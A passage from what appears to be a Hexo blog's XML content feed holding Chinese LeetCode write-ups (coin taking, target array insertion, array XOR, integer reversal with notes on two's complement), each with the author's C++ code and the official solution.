<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，本来想是不是要用到栈stack，后来一想好像不需要就可以完成。😶</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>拿硬币</title>
    <url>/2020/11/09/%E6%8B%BF%E7%A1%AC%E5%B8%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/na-ying-bi/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>桌上有 <code>n</code> 堆力扣币，每堆的数量保存在数组 <code>coins</code> 中。我们每次可以选择任意一堆，拿走其中的一枚或者两枚，求拿完所有力扣币的最少次数。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[4,2,1]</span><br><span class="line">输出：4</span><br><span class="line">解释：第一堆力扣币最少需要拿 2 次，第二堆最少需要拿 1 次，第三堆最少需要拿 1 次，总共 4 次即可拿完。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[2,3,10]</span><br><span class="line">输出：8</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 4</code></li>
<li><code>1 &lt;= coins[i] &lt;= 10</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历n堆力扣币coins，对每一堆判断是否大于0，有则次数加1，币数减2循环计算。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗8.4M，击败9.29%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minCount</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; coins)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;coins.size();++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(coins[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                ++result;</span><br><span class="line">                coins[i]-=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/na-ying-bi/solution/na-ying-bi-by-leetcode-solution/">官方题解</a>:</h6><p><strong>题意概述</strong><br>有 n 堆硬币，每次从任意一堆拿走一枚或者两枚。问最少几次能够全部拿完。</p>
<p><strong>题解</strong><br>题目中虽然给了 n 堆硬币，但是最终每一堆都是要拿完的。而每一堆拿的情况又不影响其他硬币堆，<strong>因此每一堆硬币的拿法实际上是互相独立的</strong>。</p>
<p>于是我们可以只考虑一堆的情况。假设一堆有 x 枚硬币，既然我们的目的是尽早拿完所有硬币堆，那么两枚两枚的拿显然是更快的。</p>
<p>求单堆硬币最小次数：<code>(x+1)//2</code></p>
<p>那么，拿完所有硬币堆只需要循环对所有硬币堆都计算一次，然后求和就可以了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minCount</span>(<span class="params">self, coins: List[int]</span>) -&gt; int:</span></span><br><span class="line">        <span class="keyword">return</span> sum([(x+<span class="number">1</span>)//<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> coins])</span><br></pre></td></tr></table></figure>
<h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><ul>
<li>时间复杂度：$O(n)$。</li>
<li>空间复杂度：$O(n)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解是python解法，用官方的思路c++实现跟我的代码效率也差不多!。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>按既定顺序创建目标数组</title>
    <url>/2020/11/09/%E6%8C%89%E6%97%A2%E5%AE%9A%E9%A1%BA%E5%BA%8F%E5%88%9B%E5%BB%BA%E7%9B%AE%E6%A0%87%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/create-target-array-in-the-given-order/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你两个整数数组 <code>nums</code> 和 <code>index</code>。你需要按照以下规则创建目标数组：</p>
<p>目标数组 <code>target</code> 最初为空。<br>按从左到右的顺序依次读取 <code>nums[i]</code> 和 <code>index[i]</code>，在 <code>target</code> 数组中的下标 <code>index[i]</code> 处插入值 <code>nums[i]</code> 。<br>重复上一步，直到在 <code>nums</code> 和 <code>index</code> 中都没有要读取的元素。<br>请你返回目标数组。</p>
<p>题目保证数字插入位置总是存在。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [0,1,2,3,4], index &#x3D; [0,1,2,2,1]</span><br><span class="line">输出：[0,4,1,3,2]</span><br><span class="line">解释：</span><br><span class="line">nums       index     target</span><br><span class="line">0            0        [0]</span><br><span class="line">1            1        [0,1]</span><br><span class="line">2            2        [0,1,2]</span><br><span class="line">3            2        [0,1,3,2]</span><br><span class="line">4            1        [0,4,1,3,2]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3,4,0], index &#x3D; [0,1,2,3,0]</span><br><span class="line">输出：[0,1,2,3,4]</span><br><span class="line">解释：</span><br><span class="line">nums       index     target</span><br><span class="line">1            0        [1]</span><br><span class="line">2            1        [1,2]</span><br><span class="line">3            2        [1,2,3]</span><br><span class="line">4            3        [1,2,3,4]</span><br><span class="line">0            0        [0,1,2,3,4]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1], index &#x3D; [0]</span><br><span class="line">输出：[1]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length, index.length &lt;= 100</code></li>
<li><code>nums.length == index.length</code></li>
<li><code>0 &lt;= nums[i] &lt;= 100</code></li>
<li><code>0 &lt;= index[i] &lt;= i</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历，将每一个nums中的元素插入到目标数组中，相应的位置为index中元素的值。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败69.65%，内存消耗8.5M，击败29.71%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">createTargetArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; index)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.size();++i)&#123;</span><br><span class="line">            result.insert(result.begin()+index[i],nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/create-target-array-in-the-given-order/solution/an-ji-ding-shun-xu-chuang-jian-mu-biao-shu-zu-by-l/">官方题解</a>:</h6><p><strong>方法一：模拟</strong><br><strong>思路</strong></p>
<p>使用顺序表作为答案的存储结构，按照题意模拟即可。具体的方法是：要在当前的下标从 $0$ 开始长度为 $n$ 的顺序表的 $i$ 位置插入元素，就要先把原来表中区间$[i, n]$中的元素从全部向后移动一位，然后在 $i$ 位置插入带插入的元素。当然很多语言中都有现成的方法可以调用，比如 C++ <code>vector</code> 类中的 <code>insert</code>、Python 列表中的 <code>insert</code> 等。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗8.7M，击败5.43%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">createTargetArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; index)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; r;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; nums.size(); ++i) &#123;</span><br><span class="line">            r.insert(r.begin() + index[i], nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>记数组的长度为 $n$。</p>
<ul>
<li>时间复杂度：考虑一次操作最坏情况下的时间代价和当前数组中元素的个数呈正比， 第 $i$ 次操作时元素个数为 $i - 1$，所以这里渐进时间复杂度为 $O(\sum_{i = 1}^{n} (i - 1)) = O(n^2)$</li>
<li>空间复杂度：这里没有使用到辅助空间，故渐进空间复杂度为 $O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>解题过程和官方题解一致，代码也几乎相同，应该是最优解了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>数组异或操作</title>
    <url>/2020/11/07/%E6%95%B0%E7%BB%84%E5%BC%82%E6%88%96%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/xor-operation-in-an-array/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你两个整数，<code>n</code> 和 <code>start</code> 。</p>
<p>数组 <code>nums</code> 定义为：<code>nums[i] = start + 2*i</code>（下标从 0 开始）且 <code>n == nums.length</code> 。</p>
<p>请返回 <code>nums</code> 中所有元素按位异或（<strong>XOR</strong>）后得到的结果。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 5, start &#x3D; 0</span><br><span class="line">输出：8</span><br><span class="line">解释：数组 nums 为 [0, 2, 4, 6, 8]，其中 (0 ^ 2 ^ 4 ^ 6 ^ 8) &#x3D; 8 。</span><br><span class="line">     &quot;^&quot; 为按位异或 XOR 运算符。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 4, start &#x3D; 3</span><br><span class="line">输出：8</span><br><span class="line">解释：数组 nums 为 [3, 5, 7, 9]，其中 (3 ^ 5 ^ 7 ^ 9) &#x3D; 8.</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 1, start &#x3D; 7</span><br><span class="line">输出：7</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 10, start &#x3D; 5</span><br><span class="line">输出：2</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 1000</code></li>
<li><code>0 &lt;= start &lt;= 1000</code></li>
<li><code>n == nums.length</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>对循环得到的元素值进行异或。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100%，内存消耗6.2M，击败10.03%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">xorOperation</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=start;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;++i)&#123;</span><br><span class="line">            result^=start+<span class="number">2</span>*i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/xor-operation-in-an-array/solution/shu-zu-yi-huo-cao-zuo-by-leetcode-solution/">官方题解：</a></h6><p><strong>方法一：模拟</strong><br><strong>思路</strong></p>
<p>按照题意模拟即可：</p>
<ul>
<li>初始化 \rm ans = 0ans=0</li>
<li>遍历区间 $[0, n - 1]$中的每一个整数$i$，令 $ans$与每一个R$start+2i$ 做异或运算</li>
<li>最终返回 $ans$，即我们需要的答案</li>
</ul>
<p><strong>代码：</strong>（执行0s，击败100%，内存6.1M，击败17.68%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">xorOperation</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            ans ^= (start + i * <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$。这里用一重循环对 $n$ 个数字进行异或。</li>
<li>空间复杂度：$O(1)$。这里只是用了常量级别的辅助空间。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我的答案和官方题解一样，这个执行用时内存消耗什么的每次都会有微小的差异，这个没关系的，继续加油吧🤔!。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>整数反转</title>
    <url>/2020/10/22/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/two-sum/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>两数之和</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给出一个32位的有符号整数，你需要将这个整数中每位上的数字进行反转。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：123</span><br><span class="line">输出：321</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：-123</span><br><span class="line">输出：-321</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：120</span><br><span class="line">输出：21</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<p>假设我们的环境只能存储得下32位的有符号整数，则其数值范围为[-2<sup>31</sup>,2<sup>31</sup>-1]。请根据这个假设，如果反转后整数溢出那么就返回0。</p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p>下面是自己提交通过的代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;<span class="comment">//i是整数x的10进制位数</span></span><br><span class="line">        <span class="keyword">long</span> rev=<span class="number">0</span>;<span class="comment">//一定要初始化，long类型8字节反转后不会超出范围</span></span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; values&#123;&#125;;<span class="comment">//存储10进制整数x的每一位</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            values.push_back(x%<span class="number">10</span>);<span class="comment">//3 2 1</span></span><br><span class="line">            x=x/<span class="number">10</span>;<span class="comment">//12 1 0</span></span><br><span class="line">        &#125;<span class="keyword">while</span>(x!=<span class="number">0</span>);</span><br><span class="line">        i=values.size();<span class="comment">//整数x的10进制位数</span></span><br><span class="line">        <span class="comment">//求反转后的数值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;i;k++)&#123;</span><br><span class="line">            rev+=values[k]*<span class="built_in">pow</span>(<span class="number">10</span>,i-k<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//反转后整数溢出</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(rev)&gt;<span class="number">2147483648</span>)&#123;</span><br><span class="line">            rev=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a>官方题解：</h6><p><strong>方法：弹出和推入数字 &amp; 溢出前进行检查</strong><br><strong>思路</strong></p>
<p>我们可以一次构建反转整数的一位数字。在这样做的时候，我们可以预先检查向原整数附加另一位数字是否会导致溢出。</p>
<p><strong>算法</strong></p>
<p>反转整数的方法可以与反转字符串进行类比。</p>
<p>我们想重复“弹出” xx 的最后一位数字，并将它“推入”到 rev 的后面。最后，rev将与x 相反。</p>
<p>要在没有辅助堆栈 / 数组的帮助下 “弹出” 和 “推入” 数字，我们可以使用数学方法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//pop operation:</span></span><br><span class="line">pop = x % <span class="number">10</span>;</span><br><span class="line">x /= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//push operation:</span></span><br><span class="line">temp = rev * <span class="number">10</span> + pop;</span><br><span class="line">rev = temp;</span><br></pre></td></tr></table></figure>
<p>但是，这种方法很危险，因为当$temp=rev·10+pop$  时会导致溢出。</p>
<p>幸运的是，事先检查这个语句是否会导致溢出很容易。</p>
<p>为了便于解释，我们假设 rev 是正数。</p>
<ol>
<li>如果$temp=rev·10+pop$导致溢出，那么一定有$rev\geqq\frac{INTMAX}{10}$。</li>
<li>如果$rev\geqq\frac{INTMAX}{10}$，那么$temp=rev·10+pop$一定会溢出。</li>
<li>如果$rev\geqq\frac{INTMAX}{10}$，那么只要pop&gt;7，$temp=rev·10+pop$就会溢出。</li>
</ol>
<p>当rev为负时可以应用类似的逻辑。</p>
<p><strong>代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rev = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> pop = x % <span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (rev &gt; INT_MAX/<span class="number">10</span> || (rev == INT_MAX / <span class="number">10</span> &amp;&amp; pop &gt; <span class="number">7</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (rev &lt; INT_MIN/<span class="number">10</span> || (rev == INT_MIN / <span class="number">10</span> &amp;&amp; pop &lt; <span class="number">-8</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            rev = rev * <span class="number">10</span> + pop;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(log(x))$，x中大约有$ \log_{10}(x)$位数字。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓知 识 点🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓</center>

<h6 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h6><p><strong>1、数据在计算机中的存储:</strong></p>
<p><strong>机器数：</strong>一个数在计算机中的表现形式叫做机器数，这个数有正负之分，在计算机中用一个数的最高位（符号位）表示它的正负，其中0表示正数，1表示负数。</p>
<p><strong>真数：</strong>计算机中的机器数对应的真实的值就是真数，对最高位（符号位）后面的二进制转换成10进制，并根据最高位来确定这个数的正负。</p>
<p><strong>原码：</strong>符号位加上真数的绝对值，第一位表示符号，其余位表示值。</p>
<p><strong>反码：</strong>正数的反码是其本身；负数的反码是在原码的基础上，符号位不变，其余各位取反。</p>
<p><strong>补码：</strong>正数的补码就是其本身；负数的补码是在其原码的基础上，符号位不变其余各位取反最后加1（即在反码的基础上加1）。</p>
<p><strong>2、问题</strong>：原码是被人脑直接识别并用于计算的表达方式，为何还会有反码和补码呢？？？👀</p>
<ul>
<li><p>人脑很容易可以知道第一位是符号位，而对于计算机而言，辨别“符号位”基础电路设计会变得十分复杂，于是人们考虑将符号位也参与运算并且只保留加法，减去一个数等于加上它的负数。</p>
</li>
<li><p>若用原码表示，让符号位也参与运算，能满足正数的加法，但无法满足负数的加法结果不正确。若用反码计算减法，会有[0000 0000]<sub>原</sub>、[1000 0000]<sub>原</sub>两个编码表示0。若用补码表示，可以用[0000 0000]<sub>原</sub>表示0，不但解决了0的两个编码问题，而且可以用[1000 0000]<sub>补</sub>表示-128，注意：因为实际上是使用以前-0的补码来表示，所以-128并没有原码和反码表示。</p>
</li>
<li>使用补码不仅修复了0的符号以及存在两个编码的问题且还能多表示一个最低数，这就是为什么8位二进制使用源码或反码表示的范围为[-127,+127]，而使用补码表示范围为[-128,127]。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>反转之后的整数，我是在do where循环外面利用for循累加起来的，没有想到在do where循环里面可以直接在弹出x数字的同时推入到反转整数的后面，又学到了，再接再厉吧😛。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>整数的各位积和之差</title>
    <url>/2020/11/09/%E6%95%B4%E6%95%B0%E7%9A%84%E5%90%84%E4%BD%8D%E7%A7%AF%E5%92%8C%E4%B9%8B%E5%B7%AE/</url>
